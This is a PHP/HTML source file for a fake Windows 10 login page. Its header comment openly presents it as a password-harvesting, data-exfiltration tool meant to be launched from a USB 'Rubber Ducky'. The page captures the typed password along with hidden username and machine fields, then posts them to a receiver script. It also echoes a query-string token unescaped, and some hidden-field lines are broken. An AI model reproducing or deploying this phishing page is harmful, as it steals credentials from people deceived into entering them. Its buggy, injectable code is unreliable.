<?php
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

/*
Windows10-Login-Screen-HTML
A PHP/HTML clone of the Windows 10 Login screen that can accept querystrings to dynamically customize the page.
It is preconfigured with some elements to make it work as a data exfiltration tool on - for example - a USB "Rubber Ducky" device.  This form would submit to the "WinLoginReceiver.php" file which processes the data and displays a Blue Screen of Death screen.
If any querystrings are not provided (such as machine name or display name) the script simply adds a value.

Author: Bob McKay
August 2022
GitHub: https://github.com/p0ep0e/Windows10-Login-Screen-HTML
*/

function sanitizeAlphaNumericOnly($dirtyString){
    return preg_replace("/[^a-zA-Z0-9 ]+/", "", $dirtyString);
}

$duckyToken = $_GET['duckyToken'];

if (!empty($_GET['displayName'])) {
    $displayName = sanitizeAlphaNumericOnly($_GET['displayName']);
}else{
    $displayName = 'Default User';
}
if (!empty($_GET['userName'])) {
    $userName = sanitizeAlphaNumericOnly($_GET['userName']);
}else{
    $userName = 'unknown';
}
if (!empty($_GET['machineName'])) {
    $machineName = sanitizeAlphaNumericOnly($_GET['machineName']);
}else{
    $machineName = 'DESKTOP SP2BK2';
}

?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Windows Login</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400&display=swap" rel="stylesheet">
<style>
    body{margin:0;padding:0;font-family:'Open Sans',sans-serif;overflow:hidden}
    #container{width:100%;height:100%;background-image:url(assets/wharariki-cave-overlay.jpg);background-position:center;background-repeat:no-repeat;background-size:cover;font-size:16px;color:#fff}
    #container #inner{width:400px;position:relative;position:relative;top:50%;transform:translateY(-50%);margin:0 auto;animation:fadeIn 1s ease-in-out,descend .5s ease-in-out}
    #container #inner #usrImg,#container #inner #usrName,#container #inner #frmInpu{text-align:center}
    #container #inner #usrImg{margin:0 auto;width:180px;height:180px;background-image:url(assets/w10userimg.png);background-size:contain;background-position-x:center;background-position-y:center;background-repeat:no-repeat}
    #container #inner #usrName{margin-bottom:40px;margin-top:20px;font-family:"Open Sans Light";font-size:1.6em;font-weight:lighter}
    #container #inner #frmInpu{height:32px;border:2px solid rgba(255,255,255,.6);background-color:rgba(0,0,0,.5);padding:0}
    #container #inner #frmInpu #password{margin:0 auto;height:32px;width:300px;padding-left:8px;border:none;background:transparent;color:#FFF;font-size:18px;float:left}
    #container #inner #frmInpu:hover{border:2px solid rgba(255,255,255,1)}
    input:focus{outline-width:0}
    #container #inner #frmInpu #submit{height:32px;width:32px;position:relative;float:right;right:0;background-image:url(assets/w10sbmt.png);background-color:transparent;border:none;cursor:pointer}
    #loginIcons{width:138px;height:30px;position:absolute;right:40px;background-image:url(assets/W10LoginIcons.png);background-size:contain;background-repeat:no-repeat;bottom:40px}
    #signTxt p{text-align:center}
</style>
</head>
<body>
    <form action="winLoginReceiver.php" method="post">
        <div id="container" class="login-page">
            <div id="inner">
                <div id="usrImg"></div>
                <div id="usrName"><h2><?=$displayName?></h2></div>
                <div id="frmInpu">
                    <input type="password" id="password" placeholder="Enter password" name="password" data-lpignore="true">
                    <button id="submit" onclick="submitPassword()"></button>
                </div>
                <div id="signTxt"><p>Sign in to: <?=$machineName?></p><p>Sign-in options</p></div>
            </div>
        </div>
        <div id="loginIcons"></div>
        <input type="hidden" name="duckyToken" id="duckyToken" value="<?=$duckyToken?>"><input type="hidden" name="userName" id="userName" value="<?=userName?>"><input type="hidden" name="machineName" id="machineName" value="<?=machineName?>">
    </form>
</body>
</html>
